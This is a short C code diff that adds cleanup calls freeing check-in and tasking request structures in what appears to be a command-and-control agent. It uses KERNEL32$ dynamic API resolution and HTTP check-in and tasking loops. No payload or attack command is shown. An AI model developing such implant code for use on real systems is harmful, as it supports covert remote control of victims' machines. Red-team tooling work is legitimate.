@@ -53,6 +53,7 @@ void perform_checkin(AgentParams *params, HttpHandle *http, CheckinReply *reply)
 	}
 	
 	// Free unneeded allocations.
+	free_checkin_request(&checkin);
 	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
 	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
 	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
@@ -79,6 +80,7 @@ void perform_tasking(AgentParams *params, HttpHandle *http, TaskingReply *reply)
 	}
 	
 	// Free unneeded allocations.
+	free_tasking_request(&tasking);
 	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
 	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
 	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
